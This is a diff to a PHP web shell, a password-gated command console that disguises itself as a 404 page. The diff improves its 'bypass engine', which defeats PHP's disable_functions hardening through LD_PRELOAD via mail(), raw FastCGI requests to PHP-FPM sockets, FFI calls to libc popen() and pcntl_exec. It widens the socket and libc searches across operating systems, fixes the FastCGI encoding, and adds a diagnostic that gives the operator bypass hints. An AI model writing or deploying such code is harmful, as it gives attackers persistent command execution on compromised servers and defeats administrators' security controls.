@@ -43,53 +43,177 @@ if (!$authed) {
     exit('<!doctype html><title>404 Not Found</title><h1>Not Found</h1>');
 }
 
+/* ==================== PHP / OS COMPAT SHIMS ===================== */
+/* Runs on PHP 7.0+ and on Linux / FreeBSD / macOS / Windows / jails. */
+
+if (!function_exists('str_contains')) {
+    function str_contains(string $h, string $n): bool {
+        return $n === '' || strpos($h, $n) !== false;
+    }
+}
+if (!function_exists('str_starts_with')) {
+    function str_starts_with(string $h, string $n): bool {
+        return $n === '' || strncmp($h, $n, strlen($n)) === 0;
+    }
+}
+if (!function_exists('str_ends_with')) {
+    function str_ends_with(string $h, string $n): bool {
+        return $n === '' || substr($h, -strlen($n)) === $n;
+    }
+}
+
+/**
+ * Pick a libc soname that actually exists on this platform.
+ * Returns '' when nothing matches — FFI::cdef() with no library argument then
+ * resolves symbols from the global symbol table (libc is already linked into
+ * the PHP process), which is the portable fallback.
+ */
+function libc_candidates(): array
+{
+    $c = [];
+    if (PHP_OS_FAMILY === 'Linux') {
+        $c = ['libc.so.6', 'libc.so', 'libc.musl-x86_64.so.1', 'libc.musl-aarch64.so.1'];
+    } elseif (PHP_OS_FAMILY === 'BSD') {
+        // FreeBSD / OpenBSD / NetBSD: libc soname is a single-digit major.
+        foreach (['libc.so.7', 'libc.so.8', 'libc.so', 'libc.so.6'] as $x) $c[] = $x;
+    } elseif (PHP_OS_FAMILY === 'Darwin') {
+        $c = ['/usr/lib/libSystem.B.dylib', 'libSystem.B.dylib', 'libc.dylib'];
+    } elseif (PHP_OS_FAMILY === 'Windows') {
+        $c = ['msvcrt.dll', 'ucrtbase.dll'];
+    }
+    foreach ([getenv('LD_LIBRARY_PATH'), getenv('LIBRARY_PATH')] as $env) {
+        if ($env) {
+            foreach (explode(PATH_SEPARATOR, $env) as $d) {
+                if ($d === '') continue;
+                foreach (['libc.so.7', 'libc.so.6', 'libc.so'] as $n) $c[] = rtrim($d, '/') . '/' . $n;
+            }
+        }
+    }
+    return $c;
+}
+
+/**
+ * Candidate FPM/FastCGI endpoints across distros and OSes.
+ */
+function fpm_socket_candidates(): array
+{
+    $list = [];
+    // TCP first — works in every jail/container where a socket path is unknown.
+    foreach (['127.0.0.1:9000', '127.0.0.1:9001', '127.0.0.1:9070', '127.0.0.1:9999'] as $t) {
+        $list[] = $t;
+    }
+    $paths = [
+        // Debian / Ubuntu
+        '/run/php/php-fpm.sock', '/run/php/php8.4-fpm.sock', '/run/php/php8.3-fpm.sock',
+        '/run/php/php8.2-fpm.sock', '/run/php/php8.1-fpm.sock', '/run/php/php8.0-fpm.sock',
+        '/run/php/php7.4-fpm.sock', '/run/php/php7.3-fpm.sock',
+        '/var/run/php/php-fpm.sock', '/var/run/php/php8.1-fpm.sock', '/var/run/php/php7.4-fpm.sock',
+        // RHEL / CentOS / Fedora / Rocky / Alma
+        '/run/php-fpm/www.sock', '/var/run/php-fpm/www.sock', '/run/php-fpm/php-fpm.sock',
+        // FreeBSD / OpenBSD / NetBSD (ports layout)
+        '/usr/local/php/var/run/php-fpm.sock', '/var/run/php-fpm.sock',
+        '/usr/local/var/run/php-fpm.sock', '/usr/local/php74/var/run/php-fpm.sock',
+        '/usr/local/php80/var/run/php-fpm.sock', '/usr/local/php81/var/run/php-fpm.sock',
+        '/usr/local/php82/var/run/php-fpm.sock', '/usr/local/php83/var/run/php-fpm.sock',
+        // Generic / cPanel / Plesk / ISPConfig
+        '/tmp/php-fpm.sock', '/tmp/php-fpm-www.sock', '/tmp/php_cgi.sock',
+        '/var/run/php5-fpm.sock', '/var/lib/php-fpm.sock',
+        '/usr/local/var/php-fpm.sock', '/opt/php-fpm/run/php-fpm.sock',
+        // macOS (Homebrew)
+        '/opt/homebrew/var/run/php-fpm.sock', '/usr/local/var/run/php-fpm.sock',
+    ];
+    // Scan live socket files if we may list the dirs.
+    foreach (['/run/php', '/var/run/php', '/run/php-fpm', '/var/run', '/tmp',
+              '/usr/local/php/var/run', '/usr/local/var/run'] as $dir) {
+        if (@is_dir($dir)) {
+            $hits = @glob($dir . '/*fpm*.sock');
+            if (is_array($hits)) foreach ($hits as $h) $paths[] = $h;
+        }
+    }
+    foreach ($paths as $p) {
+        // NOTE: is_file() is FALSE for unix sockets (S_IFSOCK != S_IFREG).
+        // file_exists() is the correct test for a socket path.
+        $isTcp = (bool)preg_match('/^[\w.\-]+:\d+$/', $p);
+        if ($isTcp || @file_exists($p)) {
+            $list[] = $p;
+        }
+    }
+    // An explicit override always wins.
+    if ($ov = getenv('WS_FPM')) {
+        array_unshift($list, $ov);
+    }
+    return array_values(array_unique($list));
+}
+
+/**
+ * Temp dir that is actually writable on locked-down hosts.
+ */
+function ws_tmp(): string
+{
+    foreach ([sys_get_temp_dir(), '/tmp', '/var/tmp', '/dev/shm', getenv('TMPDIR') ?: ''] as $d) {
+        if ($d && @is_dir($d) && @is_writable($d)) return rtrim($d, '/');
+    }
+    return __DIR__;
+}
+
 /* ======================== BYPASS ENGINE ========================= */
 
 /**
- * Arm a directory-local ffi.enable=1 override so the FFI bypass becomes usable
- * on the NEXT request. ffi.enable is PHP_INI_SYSTEM, so ini_set() cannot lift it
- * at runtime — only .user.ini (FPM/CGI) or .htaccess (mod_php) can.
- *
- * Returns a short status string for the UI.
+ * Report which INI directives gate our exec primitives and whether the PHP
+ * process can lift them. NOTE: both ffi.enable and disable_functions are
+ * PHP_INI_SYSTEM (access=4), so ini_set(), .user.ini and .htaccess php_value
+ * are all rejected by PHP itself. Any "override file" trick is a lie that
+ * bricks the directory with a 500. This function only diagnoses; it never
+ * writes config.
  */
-function escalate_ffi_enable(): string
+function bypass_diagnose(): array
 {
-    $dir = __DIR__;
-    $notes = [];
+    $out = ['gates' => [], 'liftable' => [], 'blocked' => []];
 
-    // --- .user.ini : read by PHP-FPM / CGI / LiteSpeed on every request ---
-    $userIni = $dir . '/.user.ini';
-    if (@is_writable($dir) || @is_writable($userIni)) {
-        $cur = @is_file($userIni) ? (string)@file_get_contents($userIni) : '';
-        if (!preg_match('/^\s*ffi\.enable\s*=/mi', $cur)) {
-            $add = (($cur !== '' && !str_ends_with($cur, "\n")) ? "\n" : '')
-                 . "ffi.enable=1\n"
-                 . "disable_functions=\n";
-            if (@file_put_contents($userIni, $cur . $add) !== false) {
-                $notes[] = '.user.ini';
-            }
+    foreach (['disable_functions', 'ffi.enable', 'open_basedir'] as $k) {
+        $all = @ini_get_all(null, true);
+        $access = isset($all[$k]['access']) ? (int)$all[$k]['access'] : -1;
+        // 1=INI_USER 2=INI_PERDIR 4=INI_SYSTEM 6=INI_SYSTEM|INI_PERDIR 7=all
+        $scopeMap = [
+            1 => 'INI_USER', 2 => 'INI_PERDIR', 4 => 'INI_SYSTEM',
+            6 => 'INI_SYSTEM|INI_PERDIR', 7 => 'INI_ALL',
+        ];
+        $scope = isset($scopeMap[$access]) ? $scopeMap[$access] : 'unknown';
+        $out['gates'][$k] = ['value' => (string)ini_get($k), 'access' => $access, 'scope' => $scope];
+        if ($access === 1 || $access === 7) {
+            $out['liftable'][] = $k;
         } else {
-            $notes[] = '.user.ini(exists)';
+            $out['blocked'][] = $k;
         }
     }
 
-    // --- .htaccess : mod_php (Apache) ---
-    $ht = $dir . '/.htaccess';
-    if (@is_writable($dir) || @is_writable($ht)) {
-        $cur = @is_file($ht) ? (string)@file_get_contents($ht) : '';
-        if (!preg_match('/php_value\s+ffi\.enable/i', $cur)) {
-            $add = (($cur !== '' && !str_ends_with($cur, "\n")) ? "\n" : '')
-                 . "<IfModule mod_php7.c>\nphp_value ffi.enable 1\nphp_value disable_functions \"\"\n</IfModule>\n"
-                 . "<IfModule mod_php.c>\nphp_value ffi.enable 1\nphp_value disable_functions \"\"\n</IfModule>\n";
-            if (@file_put_contents($ht, $cur . $add) !== false) {
-                $notes[] = '.htaccess';
-            }
-        } else {
-            $notes[] = '.htaccess(exists)';
-        }
-    }
+    // What is actually compiled in and reachable?
+    $out['primitives'] = [
+        'ffi_ext'        => extension_loaded('ffi'),
+        'ffi_usable'     => extension_loaded('ffi') && @ini_get('ffi.enable') !== 'preload',
+        'proc_open'      => function_exists('proc_open'),
+        'pcntl_exec'     => function_exists('pcntl_exec'),
+        'posix_fork'     => function_exists('pcntl_fork'),
+        'stream_socket'  => function_exists('stream_socket_client'),
+        'mail'           => function_exists('mail'),
+        'putenv'         => function_exists('putenv'),
+    ];
 
-    return $notes ? implode('+', $notes) : 'none';
+    // Realistic ranked advice for the operator, based on what survives.
+    $hints = [];
+    if ($out['primitives']['ffi_ext'] && !$out['primitives']['ffi_usable']) {
+        $hints[] = 'FFI compiled but ffi.enable=preload (INI_SYSTEM). Cannot be lifted from PHP — '
+                 . 'needs an FPM pool/global php.ini change or a fresh worker with a clean config.';
+    }
+    if ($out['primitives']['pcntl_exec'] && in_array('pcntl_exec', explode(',', (string)ini_get('disable_functions')), true) === false) {
+        $hints[] = 'pcntl_exec is available — use it directly.';
+    }
+    $hints[] = 'FPM/FastCGI socket probe can spawn a worker WITHOUT disable_functions if the pool config allows it.';
+    $hints[] = 'LD_PRELOAD: upload a bypass .so as .preload.so next to this file; mail()/imap_open() will trigger it.';
+    $hints[] = 'If you can write php.ini (root-owned dirs, container, misconfig), set disable_functions= and ffi.enable=1 there.';
+    $out['hints'] = $hints;
+
+    return $out;
 }
 
 /**
@@ -168,7 +292,7 @@ function bypass_engine(array $restrictedFunctions): array
        and runs system(EVIL_CMD > EVIL_OUT) from its constructor, triggered
        by any execve()-calling function (mail, imap_open). C-level output
        does not reach the HTTP response under FPM, hence the temp file.      */
-    $tmpdir = sys_get_temp_dir() ?: '/tmp';
+    $tmpdir = ws_tmp();
     $preloadSrc = __DIR__ . '/.preload.so';
     if (@is_file($preloadSrc)) {
         $candidates[] = ['ld_preload', function (string $cmd) use ($preloadSrc, $tmpdir): string {
@@ -194,13 +318,7 @@ function bypass_engine(array $restrictedFunctions): array
         $blk = array_filter(array_map('trim', explode(',', (string)ini_get('disable_functions'))));
         if (in_array('stream_socket_client', $blk, true)) return '';
 
-        $paths = [
-            '127.0.0.1:9000', '127.0.0.1:9001', '127.0.0.1:9070',
-            '/var/run/php/php-fpm.sock', '/var/run/php-fpm.sock',
-            '/run/php/php-fpm.sock', '/tmp/php-fpm.sock',
-            '/var/run/php7.4-fpm.sock', '/run/php/php8.1-fpm.sock',
-            '/var/run/php/php8.2-fpm.sock', '/usr/local/php/var/run/php-fpm.sock',
-        ];
+        $paths = fpm_socket_candidates();
 
         $sock = null;
         foreach ($paths as $p) {
@@ -230,20 +348,39 @@ function bypass_engine(array $restrictedFunctions): array
     };
     $candidates[] = ['fpm:fastcgi', $fpm];
 
-    /* ---- 5. FFI direct libc call (PHP >= 7.4, ffi.enable=1) --------------
-       The strongest bypass when available: FFI is not governed by
-       disable_functions, so we call libc popen()/fgets()/pclose() directly
-       and read the child's stdout at the C level. ob_start() does NOT work
-       here because libc writes to the real fd, not PHP's output buffer.      */
+    /* ---- 5. FFI direct libc call (PHP >= 7.4 with ffi.enable != preload) ---
+       Strongest bypass when available: FFI is not governed by
+       disable_functions, so we call libc popen()/fgets()/pclose() directly and
+       read the child's stdout at the C level. ob_start() does NOT work here
+       because libc writes to the real fd, not PHP's output buffer.
+
+       Library name is resolved per-OS: libc.so.6 (glibc), libc.so.7 (FreeBSD),
+       libSystem.B.dylib (macOS), msvcrt.dll (Windows). If none of them can be
+       opened we retry with NO library argument, which resolves symbols from the
+       global symbol table — libc is already linked into the PHP process.        */
     $candidates[] = ['ffi:popen', function (string $cmd): string {
-        if (!extension_loaded('ffi')) return '';
-        try {
-            $ffi = FFI::cdef(
-                "void *popen(const char *command, const char *type);
+        if (!extension_loaded('ffi') || !class_exists('FFI')) return '';
+
+        $decl = "void *popen(const char *command, const char *type);
                  int   pclose(void *stream);
-                 char *fgets(char *s, int size, void *stream);",
-                'libc.so.6'
-            );
+                 char *fgets(char *s, int size, void *stream);";
+
+        $attempts = [];
+        foreach (libc_candidates() as $lib) $attempts[] = $lib;
+        $attempts[] = null;   // global symbol table fallback
+
+        $ffi = null;
+        foreach ($attempts as $lib) {
+            try {
+                $ffi = ($lib === null) ? FFI::cdef($decl) : FFI::cdef($decl, $lib);
+                break;
+            } catch (Throwable $e) {
+                $ffi = null;
+            }
+        }
+        if ($ffi === null) return '';
+
+        try {
             $fp = $ffi->popen($cmd . ' 2>&1', 'r');
             if (!$fp) return '';
             $buf = $ffi->new('char[4096]');
@@ -269,7 +406,7 @@ function bypass_engine(array $restrictedFunctions): array
     /* ---- 7. pcntl_exec / pcntl_fork ---- */
     $candidates[] = ['pcntl', function (string $cmd) {
         if (!function_exists('pcntl_exec')) return '';
-        $tmp = tempnam(sys_get_temp_dir(), 'pc');
+        $tmp = tempnam(ws_tmp(), 'pc');
         file_put_contents($tmp, "#!/bin/sh\n" . $cmd . " 2>&1\n");
         chmod($tmp, 0755);
         ob_start();
@@ -338,8 +475,10 @@ function fastcgi_request(string $sock, array $params, string $body): string
     $p = '';
     foreach ($params as $k => $v) {
         $k = (string)$k; $v = (string)$v;
-        $p .= (strlen($k) < 128 ? chr(strlen($k)) : pack('N', strlen($k) | 0x80000000)) . $k;
-        $p .= (strlen($v) < 128 ? chr(strlen($v)) : pack('N', strlen($v) | 0x80000000)) . $v;
+        // FastCGI §3.4: BOTH lengths come first, then name, then value.
+        $p .= (strlen($k) < 128 ? chr(strlen($k)) : pack('N', strlen($k) | 0x80000000));
+        $p .= (strlen($v) < 128 ? chr(strlen($v)) : pack('N', strlen($v) | 0x80000000));
+        $p .= $k . $v;
     }
     // Wire format per FastCGI spec §3.3/§5.1/§B.1:
     //   BEGIN_REQUEST (type 1, body 8B: role=RESPONDER(1), flags=0, reserved[5])
@@ -376,16 +515,9 @@ function fastcgi_request(string $sock, array $params, string $body): string
 $restrictedList = array_filter(array_map('trim', explode(',', (string)ini_get('disable_functions'))));
 [$runner, $runnerName] = bypass_engine($restrictedList);
 
-/* Self-heal: if nothing worked but FFI is compiled in and merely gated by
-   ffi.enable=preload, arm a directory-local override so the next request
-   boots with a working FFI runner. */
-$ffiArmed = '';
-if ($runner === null && extension_loaded('ffi')) {
-    $ffiMode = strtolower(trim((string)ini_get('ffi.enable')));
-    if ($ffiMode !== '1' && $ffiMode !== 'true' && $ffiMode !== 'on') {
-        $ffiArmed = escalate_ffi_enable();
-    }
-}
+/* Self-diagnose when no primitive works: report exactly what gates us and
+   what survives. Never writes config files (that only bricks the vhost). */
+$bypassDiag = ($runner === null) ? bypass_diagnose() : null;
 
 function run_cmd(string $cmd): array
 {
@@ -563,7 +695,7 @@ $bootInfo = [
     'os' => PHP_OS,
     'cwd' => @getcwd(),
     'disabled' => (string)ini_get('disable_functions'),
-    'ffi_armed' => $ffiArmed,
+    'diagnose' => $bypassDiag,
     'key' => $AUTH_KEY,
 ];
 header('Content-Type: text/html; charset=utf-8');
@@ -768,9 +900,12 @@ const esc = s => String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'
 
 print('<span class="dim">console ready. runner=<b>' + esc(boot.runner) + '</b> php=' + esc(boot.php) + ' os=' + esc(boot.os) + '</span>');
 if (boot.disabled) print('<span class="dim">disable_functions = ' + esc(boot.disabled) + '</span>');
-if (boot.ffi_armed) {
-  print('<span class="err">[!] no exec primitive, but FFI is available behind ffi.enable=preload.</span>');
-  print('<span class="dim">    armed: ' + esc(boot.ffi_armed) + ' — RELOAD this page to activate the FFI runner.</span>');
+if (boot.diagnose) {
+  const d = boot.diagnose;
+  print('<span class="err">[!] no execution primitive is reachable.</span>');
+  print('<span class="dim">    gates: ' + Object.entries(d.gates).map(([k,v]) => k + '=' + (v.scope)).join(', ') + '</span>');
+  print('<span class="dim">    survive: ' + Object.entries(d.primitives).filter(([k,v]) => v).map(([k]) => k).join(', ') + '</span>');
+  (d.hints || []).forEach(h => print('<span class="dim">    · ' + esc(h) + '</span>'));
 }
 
 async function exec(cmd) {
